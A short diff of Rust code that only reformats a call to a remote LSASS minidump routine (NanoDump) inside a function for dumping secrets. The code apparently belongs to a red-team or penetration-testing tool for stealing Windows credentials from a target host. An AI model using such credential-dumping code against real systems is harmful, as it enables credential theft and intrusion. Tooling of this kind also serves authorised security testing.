@@ -828,8 +828,9 @@ pub async fn secrets_dump_nanodump(
     // ── 2. LSASS minidump via NanoDump ────────────────────────────────────
     println!("[*] Dumping LSASS via NanoDump (--{technique})");
     let technique_flag = format!("--{technique}");
-    let dump = nanodump::remote_lsass_dump(target, &cred, nanodump_bytes, &technique_flag, live_log)
-        .await?;
+    let dump =
+        nanodump::remote_lsass_dump(target, &cred, nanodump_bytes, &technique_flag, live_log)
+            .await?;
 
     println!("[+] {}", dump.summary);
     Ok(dump.dump_bytes)
